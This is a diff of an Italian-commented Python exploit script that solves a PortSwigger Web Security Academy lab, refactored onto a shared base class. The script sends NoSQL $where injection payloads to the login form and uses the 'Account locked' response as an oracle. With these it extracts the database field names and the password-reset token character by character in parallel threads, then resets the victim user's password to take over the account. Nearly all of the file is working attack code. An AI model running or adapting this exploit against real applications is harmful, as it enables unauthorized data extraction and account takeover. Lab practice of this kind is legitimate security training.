@@ -6,78 +6,37 @@ import time
 import threading
 import random
 from concurrent.futures import ThreadPoolExecutor
-from lxml import html
+from base_exploit import BaseNoSQLExploit, print_error, print_success, print_info, GREEN, RED, CYAN, YELLOW, WHITE, RESET, BOLD, MY_ACCOUNT_ENDPOINT
 
 # Disabilita i warning SSL
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# --- GESTIONE COLORI ---
-try:
-    from colorama import init, Fore, Style
-    init(autoreset=True)
-    GREEN = Fore.GREEN
-    RED = Fore.RED
-    CYAN = Fore.CYAN
-    YELLOW = Fore.YELLOW
-    WHITE = Fore.WHITE
-    RESET = Style.RESET_ALL
-    BOLD = Style.BRIGHT
-except Exception:
-    class Fore: RED = ''; GREEN = ''; YELLOW = ''; BLUE = ''; CYAN = ''; WHITE = ''
-    class Style: RESET_ALL = ''; BRIGHT = ''
-    GREEN = ''; RED = ''; CYAN = ''; YELLOW = ''; WHITE = ''; RESET = ''; BOLD = ''
+# ==================== CONFIGURAZIONE ====================
+LAB_ID = "YOUR_LAB_CODE_HERE"
 
-def print_error(msg): print(f"{RED}[-] {msg}{RESET}")
-def print_success(msg): print(f"{GREEN}[+] {msg}{RESET}")
-def print_info(msg): print(f"{CYAN}[*] {msg}{RESET}")
+# ==================== COSTANTI ====================
+REFRESH_RATE = 0.05  # Velocità aggiornamento visualizer
+CHARSET = string.ascii_letters + string.digits + "-_!{}"
+NEW_PASSWORD = "pwned123"  # Password per il takeover
+MAX_FIELD_SCAN = 10        # Massimo numero di campi da scansionare
+MAX_KEY_LENGTH = 25        # Lunghezza massima nome campo
+MAX_VALUE_LENGTH = 100     # Lunghezza massima valore campo
 
-# --- CONFIGURAZIONE UTENTE ---
-LAB_ID = "YOUR_LAB_CODE_HERE"  
+# ==================== EXPLOIT CLASS ==================== 
+#NoSQLMatrixExploit
 
-# --- CONFIGURAZIONE VISUALIZER ---
-REFRESH_RATE = 0.05 
-
-class NoSQLMatrixExploit:
+class OperatorInjToExtractUnknownFields(BaseNoSQLExploit):
+    """Exploit per lab PortSwigger: NoSQL Injection con estrazione dati avanzata."""
+    
     def __init__(self, lab_id):
-        self.lab_id = lab_id
-        self.base_url = f"https://{lab_id}.web-security-academy.net"
-        self.login_url = f"{self.base_url}/login"
+        super().__init__(lab_id)
         self.forgot_url = f"{self.base_url}/forgot-password"
         
-        self.session = requests.Session()
-        self.session.headers.update({"User-Agent": "Mozilla/5.0 (NoSQLi-Solver)"})
-        self.session.verify = False 
-        
-        self.charset = string.ascii_letters + string.digits + "-_!{}"
-        self.decrypted_chars = [] 
+        # Stato per parallel attack
+        self.charset = CHARSET
+        self.decrypted_chars = []
         self.stop_event = threading.Event()
-        self.current_target_desc = "" 
-
-    def check_lab_status(self):
-        try:
-            r = self.session.get(self.base_url, timeout=10)
-            return r.status_code == 200
-        except: return False
-
-    def get_csrf_token(self, url):
-        try:
-            r = self.session.get(url)
-            tree = html.fromstring(r.text)
-            val = tree.xpath('//input[@name="csrf"]/@value')
-            return val[0] if val else None
-        except: return None
-
-    # --- NUOVO CONTROLLO XPATH ---
-    def check_if_solved(self, response) -> bool:
-        """
-        Controlla la presenza dell'elemento solved nell'HTML della response tramite XPath.
-        """
-        try:
-            tree = html.fromstring(response.content)
-            SOLVED_XPATH = '//*[@id="notification-labsolved"]/div/h4'
-            return bool(tree.xpath(SOLVED_XPATH))
-        except Exception:
-            return False
+        self.current_target_desc = ""
 
     def trigger_reset(self):
         try:
@@ -88,6 +47,15 @@ class NoSQLMatrixExploit:
         except: return False
 
     def send_injection(self, where_payload):
+        """
+        Invia una NoSQL injection tramite il parametro $where.
+        
+        Args:
+            where_payload: Condizione JavaScript da iniettare
+            
+        Returns:
+            bool: True se l'account viene bloccato (condizione vera), False altrimenti
+        """
         headers = {"Content-Type": "application/json"}
         data = {
             "username": "carlos",
@@ -97,115 +65,151 @@ class NoSQLMatrixExploit:
         try:
             r = self.session.post(self.login_url, json=data, headers=headers)
             return "Account locked" in r.text
-        except: return False
+        except:
+            return False
 
-    # --- FASE 1: Field Names ---
     def get_key_length(self, key_index):
-        for length in range(1, 25): 
+        """Determina la lunghezza del nome di un campo del database.
+        
+        Args:
+            key_index: Indice del campo nella struttura Object.keys(this)
+            
+        Returns:
+            int: Lunghezza del nome del campo, None se non trovato
+        """
+        for length in range(1, MAX_KEY_LENGTH):
             payload = f"Object.keys(this)[{key_index}].length == {length}"
             if self.send_injection(payload):
                 return length
         return None
 
     def worker_crack_key_char(self, position, key_index):
+        """Worker thread per craccare un singolo carattere del nome campo.
+        
+        Args:
+            position: Posizione del carattere da trovare
+            key_index: Indice del campo nel database
+        """
         shuffled = list(self.charset)
         random.shuffle(shuffled)
+        
         for char in shuffled:
-            if self.stop_event.is_set(): break
-            if self.decrypted_chars[position] is not None: return
+            if self.stop_event.is_set():
+                break
+            if self.decrypted_chars[position] is not None:
+                return
+            
             payload = f"Object.keys(this)[{key_index}].match('^.{{{position}}}{char}.*')"
             if self.send_injection(payload):
                 self.decrypted_chars[position] = char
                 return
 
-    # --- FASE 2: Field Values ---
     def get_value_length(self, field_name):
+        """Determina la lunghezza del valore di un campo.
+        
+        Args:
+            field_name: Nome del campo di cui trovare la lunghezza del valore
+            
+        Returns:
+            int: Lunghezza del valore, None se non trovato
+        """
         print_info(f"Calcolo lunghezza valore per '{field_name}'...")
-        for length in range(1, 100):
+        for length in range(1, MAX_VALUE_LENGTH):
             payload = f"this.{field_name}.length == {length}"
             if self.send_injection(payload):
                 return length
         return None
 
     def worker_crack_value_char(self, position, field_name):
+        """Worker thread per craccare un singolo carattere del valore del campo.
+        
+        Args:
+            position: Posizione del carattere da trovare
+            field_name: Nome del campo di cui estrarre il valore
+        """
         shuffled = list(self.charset)
         random.shuffle(shuffled)
+        
         for char in shuffled:
-            if self.stop_event.is_set(): break
-            if self.decrypted_chars[position] is not None: return
+            if self.stop_event.is_set():
+                break
+            if self.decrypted_chars[position] is not None:
+                return
+            
             payload = f"this.{field_name}.match('^.{{{position}}}{char}.*')"
             if self.send_injection(payload):
                 self.decrypted_chars[position] = char
                 return
 
-    # --- Visualizer ---
     def visualizer_loop(self, total_len):
+        """Loop di visualizzazione in stile Matrix per il progresso del cracking.
+        
+        Args:
+            total_len: Lunghezza totale della stringa da craccare
+        """
         sys.stdout.write("\n")
+        
         while not self.stop_event.is_set():
             display = ""
             found_count = 0
+            
+            # Costruisci la stringa di visualizzazione
             for i in range(total_len):
                 c = self.decrypted_chars[i]
                 if c:
                     display += f"{GREEN}{BOLD}{c}{RESET}"
                     found_count += 1
                 else:
+                    # Carattere random per effetto Matrix
                     display += f"{WHITE}{random.choice(string.ascii_letters)}{RESET}"
             
-            percent = int((found_count/total_len)*100)
+            # Calcola percentuale completamento
+            percent = int((found_count / total_len) * 100)
             sys.stdout.write(f"\r {YELLOW}>> {self.current_target_desc}:{RESET} [{display}] {percent}%")
             sys.stdout.flush()
             
-            if found_count == total_len: break
+            # Termina se completato
+            if found_count == total_len:
+                break
+            
             time.sleep(REFRESH_RATE)
+        
         sys.stdout.write("\n")
 
     def run_parallel_attack(self, target_len, worker_func, *args):
+        """Esegue un attacco parallelo per craccare una stringa carattere per carattere.
+        
+        Args:
+            target_len: Lunghezza della stringa target
+            worker_func: Funzione worker da eseguire per ogni posizione
+            *args: Argomenti aggiuntivi da passare al worker
+            
+        Returns:
+            str: Stringa completa craccata
+        """
         self.decrypted_chars = [None] * target_len
         self.stop_event.clear()
         
         with ThreadPoolExecutor(max_workers=target_len + 2) as executor:
+            # Avvia worker per ogni posizione
             for i in range(target_len):
                 executor.submit(worker_func, i, *args)
+            
+            # Visualizza progresso
             self.visualizer_loop(target_len)
             self.stop_event.set()
         
         return "".join(self.decrypted_chars)
 
-    # ------------------------------------------------------------------
-    # MAIN LOGIC
-    # ------------------------------------------------------------------
-    def run(self):
-        if not self.check_lab_status(): 
-            print_error("Lab non raggiungibile.")
-            return
-
-        print_info("1. Innesco procedura reset per creare la struttura DB...")
-        if not self.trigger_reset():
-            print_error("Impossibile contattare server.")
-            return
-
-        print_info("2. SCANSIONE CAMPI DATABASE (Matrix Mode)...")
-        found_fields = {} 
+    def _select_target_field(self, found_fields):
+        """Permette all'utente di selezionare il campo target contenente il token.
         
-        # --- FASE 1: Enumerazione Campi ---
-        for i in range(10): 
-            sys.stdout.write(f"\r{CYAN}[*] Analisi campo indice {i}...{RESET}")
-            sys.stdout.flush()
+        Args:
+            found_fields: Dizionario {indice: nome_campo}
             
-            name_len = self.get_key_length(i)
-            if not name_len: break 
-                
-            self.current_target_desc = f"FIELD NAME [{i}]"
-            field_name = self.run_parallel_attack(name_len, self.worker_crack_key_char, i)
-            found_fields[i] = field_name
-            print_success(f"Trovato campo [{i}]: {field_name}")
-
-        if not found_fields:
-            print_error("Nessun campo trovato.")
-            return
-
-        # --- FASE 2: Scelta Utente ---
+        Returns:
+            str: Nome del campo selezionato, None se errore
+        """
         print("\n" + "="*40)
         print(f"{YELLOW}SELEZIONE MANUALE DEL CAMPO TARGET{RESET}")
         print("I campi trovati nel database sono:")
@@ -217,34 +221,95 @@ class NoSQLMatrixExploit:
             choice = int(input(f"{BOLD}Inserisci il numero del campo contenente il token: {RESET}"))
             if choice not in found_fields:
                 print_error("Indice non valido.")
-                return
+                return None
             target_field_name = found_fields[choice]
             print_info(f"Target selezionato: {target_field_name}")
+            return target_field_name
         except ValueError:
             print_error("Devi inserire un numero.")
+            return None
+    
+    def run(self):
+        """Esegue l'exploit completo: enumera campi, estrae token, esegue takeover."""
+        # Verifica connettività
+        if not self.check_lab_status():
+            print_error("Lab non raggiungibile.")
             return
 
-        # --- FASE 3: REFRESH TOKEN ---
+        # FASE 0: Inizializzazione database
+        print_info("1. Innesco procedura reset per creare la struttura DB...")
+        if not self.trigger_reset():
+            print_error("Impossibile contattare server.")
+            return
+
+        # FASE 1: Enumerazione campi database
+        print_info("2. SCANSIONE CAMPI DATABASE (Matrix Mode)...")
+        found_fields = {}
+        
+        for i in range(MAX_FIELD_SCAN):
+            sys.stdout.write(f"\r{CYAN}[*] Analisi campo indice {i}...{RESET}")
+            sys.stdout.flush()
+            
+            name_len = self.get_key_length(i)
+            if not name_len:
+                break  # Non ci sono più campi
+                
+            self.current_target_desc = f"FIELD NAME [{i}]"
+            field_name = self.run_parallel_attack(name_len, self.worker_crack_key_char, i)
+            found_fields[i] = field_name
+            print_success(f"Trovato campo [{i}]: {field_name}")
+
+        if not found_fields:
+            print_error("Nessun campo trovato.")
+            return
+
+        # FASE 2: Selezione campo target da parte dell'utente
+        target_field_name = self._select_target_field(found_fields)
+        if not target_field_name:
+            return
+
+        # FASE 3: Refresh token per evitare scadenza
         print("\n")
         print_info("Rigenerazione token per evitare scadenza...")
         if not self.trigger_reset():
             print_error("Errore refresh token.")
             return
 
-        # --- FASE 4: Estrazione Token ---
+        # FASE 4: Estrazione valore del token
         token_len = self.get_value_length(target_field_name)
         if token_len:
             self.current_target_desc = f"VALUE of {target_field_name}"
             final_token = self.run_parallel_attack(token_len, self.worker_crack_value_char, target_field_name)
             
-            print("\n" + f"{GREEN}=========================================={RESET}")
+            print("\n" + f"{GREEN}={'='*42}{RESET}")
             print(f"{GREEN}{BOLD} TOKEN ESTRATTO: {final_token} {RESET}")
-            print(f"{GREEN}=========================================={RESET}\n")
+            print(f"{GREEN}={'='*42}{RESET}\n")
             
             self.perform_takeover(target_field_name, final_token)
         else:
             print_error(f"Il campo {target_field_name} sembra vuoto o non leggibile.")
 
+    def _print_success_banner(self):
+        """Stampa il banner ASCII di successo."""
+        print("\n")
+        # LAB
+        print(f"{GREEN}██╗══════██╗═█████╗═██████╗═{RESET}")
+        print(f"{GREEN}██║══════██╔══██╗██╔══██╗{RESET}")
+        print(f"{GREEN}██║══════███████║██████╔╝{RESET}")
+        print(f"{GREEN}██║══════██╔══██║██╔══██╗{RESET}")
+        print(f"{GREEN}███████╗██║══██║██████╔╝{RESET}")
+        print(f"{GREEN}╚══════╝╚═╝══╚═╝╚═════╝═{RESET}")
+        print("")
+        # SOLVED
+        print(f"{GREEN}███████╗═█████╗═██╗══════██╗═══██╗███████╗██████╗═{RESET}")
+        print(f"{GREEN}██╔════╝██╔══██╗██║══════██║═══██║██╔════╝██╔══██╗{RESET}")
+        print(f"{GREEN}███████╗██║══██║██║══════██║═══██║█████╗══██║══██║{RESET}")
+        print(f"{GREEN}╚════██║██║══██║██║══════╚██╗═██╔╝██╔══╝══██║══██║{RESET}")
+        print(f"{GREEN}███████║╚█████╔╝███████╗═╚████╔╝═███████╗██████╔╝{RESET}")
+        print(f"{GREEN}╚══════╝═╚════╝═╚══════╝══╚═══╝══╚══════╝╚═════╝═{RESET}")
+        print("\n" + f"{GREEN}{BOLD} LAB SOLVED! Accesso confermato come Carlos.{RESET}")
+        print(f" Credenziali usate: carlos : {NEW_PASSWORD}")
+    
     def perform_takeover(self, token_name, token_value):
         NEW_PASS = "pwned123"
         print_info(f"Tentativo reset password con token: {token_value}")
@@ -299,45 +364,28 @@ class NoSQLMatrixExploit:
             
             # --- 3. VERIFICA ---
             # Navighiamo esplicitamente a my-account per verificare la sessione
-            account_url = f"{self.base_url}/my-account?id=carlos"
+            account_url = f"{self.base_url}{MY_ACCOUNT_ENDPOINT}?id=carlos"
             r_account = self.session.get(account_url)
 
             # 4. CONTROLLO XPATH SULLA RISPOSTA DELLA PAGINA ACCOUNT
             if self.check_if_solved(r_account):
-                print("\n")
-                # LAB
-                print(f"{GREEN}██╗░░░░░░█████╗░██████╗░{RESET}")
-                print(f"{GREEN}██║░░░░░██╔══██╗██╔══██╗{RESET}")
-                print(f"{GREEN}██║░░░░░███████║██████╔╝{RESET}")
-                print(f"{GREEN}██║░░░░░██╔══██║██╔══██╗{RESET}")
-                print(f"{GREEN}███████╗██║░░██║██████╔╝{RESET}")
-                print(f"{GREEN}╚══════╝╚═╝░░╚═╝╚═════╝░{RESET}")
-                print("") 
-                # SOLVED
-                print(f"{GREEN}███████╗░█████╗░██╗░░░░░██╗░░░██╗███████╗██████╗░{RESET}")
-                print(f"{GREEN}██╔════╝██╔══██╗██║░░░░░██║░░░██║██╔════╝██╔══██╗{RESET}")
-                print(f"{GREEN}███████╗██║░░██║██║░░░░░██║░░░██║█████╗░░██║░░██║{RESET}")
-                print(f"{GREEN}╚════██║██║░░██║██║░░░░░╚██╗░██╔╝██╔══╝░░██║░░██║{RESET}")
-                print(f"{GREEN}███████║╚█████╔╝███████╗░╚████╔╝░███████╗██████╔╝{RESET}")
-                print(f"{GREEN}╚══════╝░╚════╝░╚══════╝░░╚═══╝░░╚══════╝╚═════╝░{RESET}")
-                
-                print("\n" + f"{GREEN}{BOLD} LAB SOLVED! Accesso confermato come Carlos.{RESET}")
-                print(f" Credenziali usate: carlos : {NEW_PASS}")
+                self._print_success_banner()
             else:
                 # Fallback check
                 if "Your username is: carlos" in r_account.text or "My account" in r_account.text:
-                     print_success("Accesso riuscito come Carlos (Banner non rilevato, ma sei loggato!).")
-                     print(f" Credenziali usate: carlos : {NEW_PASS}")
+                    print_success("Accesso riuscito come Carlos (Banner non rilevato, ma sei loggato!).")
+                    print(f" Credenziali usate: carlos : {NEW_PASSWORD}")
                 else:
                     print_error("Login effettuato ma Banner 'Solved' NON trovato e sessione non confermata.")
-                    # Debug extra se il check finale fallisce
-                    print(f"[DEBUG] Pagina My Account content (snippet): {r_account.text[:500]}")
         else:
             print_error(f"Cambio password fallito. Status: {r_reset.status_code}")
-            
+
+# ==================== ENTRY POINT ====================            
 if __name__ == "__main__":
-    if "INSERISCI" in LAB_ID:
-        print_error("Inserisci il LAB_ID!")
-        sys.exit()
-    exploit = NoSQLMatrixExploit(LAB_ID)
+    # Validazione configurazione
+    if not BaseNoSQLExploit.validate_lab_id(LAB_ID, "YOUR_LAB_CODE_HERE"):
+        sys.exit(1)
+    
+    # Esecuzione exploit
+    exploit = OperatorInjToExtractUnknownFields(LAB_ID)
     exploit.run()
